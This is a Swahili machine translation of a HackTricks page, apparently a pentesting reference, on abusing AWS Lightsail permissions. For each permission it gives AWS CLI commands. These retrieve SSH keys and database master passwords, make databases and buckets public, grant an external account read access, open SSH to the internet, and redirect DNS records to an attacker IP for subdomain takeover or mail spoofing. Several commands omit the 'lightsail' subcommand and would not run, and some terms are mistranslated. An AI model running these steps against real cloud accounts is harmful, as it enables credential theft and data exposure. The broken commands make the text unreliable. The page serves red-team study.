# AWS - Lightsail Privesc

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Lightsail

Kwa habari zaidi kuhusu Lightsail angalia:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ni muhimu kutambua kuwa Lightsail **haitumii majukumu ya IAM yanayomilikiwa na mtumiaji** bali na akaunti iliyoandaliwa na AWS, hivyo huwezi kutumia huduma hii kwa privesc. Hata hivyo, **data nyeti** kama vile nambari, funguo za API na maelezo ya database yanaweza kupatikana kwenye huduma hii.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Ruhusa hii itakuruhusu kupata funguo za SSH kufikia mifano:
```
aws lightsail download-default-key-pair
```
**Athari Inayowezekana:** Pata habari nyeti ndani ya mifano.

### `lightsail:GetInstanceAccessDetails`

Kibali hiki kitakuruhusu kuzalisha funguo za SSH ili kupata ufikiaji wa mifano:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Athari Inayowezekana:** Pata habari nyeti ndani ya mifano.

### `lightsail:CreateBucketAccessKey`

Kibali hiki kitakuruhusu kupata ufunguo wa kufikia sanduku:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Madhara Yanayoweza Kutokea:** Pata habari nyeti ndani ya ndoo.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Kibali hiki kitakuruhusu kupata anwani za kuingia kwenye database:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Athari Inayoweza Kutokea:** Pata habari nyeti ndani ya database.

### `lightsail:UpdateRelationalDatabase`

Haki hii itakuruhusu kubadilisha nenosiri la kupata database:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Ikiwa database haipo wazi, unaweza pia kuifanya iwe wazi na ruhusa hizi kwa

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Athari Inayowezekana:** Pata habari nyeti ndani ya database.

### `lightsail:OpenInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Athari Inayoweza Kutokea:** Kufikia bandari nyeti.

### `lightsail:PutInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao. Tafadhali kumbuka kwamba wito huo utafunga bandari yoyote iliyofunguliwa ambayo haikutajwa.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Athari Inayowezekana:** Kupata ufikivu wa bandari nyeti.

### `lightsail:SetResourceAccessForBucket`

Ruhusa hii inaruhusu kutoa upatikanaji wa mifano kwa sanduku bila kuwa na vyeti ziada

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa vikasha vyenye habari nyeti.

### `lightsail:UpdateBucket`

Kwa kibali hiki, mshambuliaji anaweza kutoa upatikanaji wa kusoma kwa akaunti yake ya AWS kwenye vikasha au hata kufanya vikasha kuwa wazi kwa kila mtu:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa vikasha vyenye habari nyeti.

### `lightsail:UpdateContainerService`

Kwa ruhusa hizi, mshambuliaji anaweza kutoa upatikanaji kwa ECRs za kibinafsi kutoka kwa huduma za kontena.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Athari Inayowezekana:** Pata habari nyeti kutoka kwa ECR ya kibinafsi

### `lightsail:CreateDomainEntry`

Mshambuliaji mwenye idhini hii anaweza kuunda kikoa cha chini na kukielekeza kwa anwani yake ya IP (uchukuzi wa kikoa cha chini), au kutengeneza rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwa kikoa, au hata kuweka anwani yake ya IP kama kikoa kuu.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Athari Inayowezekana:** Kumiliki kikoa

### `lightsail:UpdateDomainEntry`

Mshambuliaji mwenye idhini hii anaweza kuunda subdomain na kuuelekeza kwa anwani yake ya IP (umiliki wa subdomain), au kutengeneza rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwa kikoa, au hata kuweka anwani yake ya IP kama anwani kuu ya kikoa.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Athari Inayowezekana:** Kuchukua udhibiti wa kikoa

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
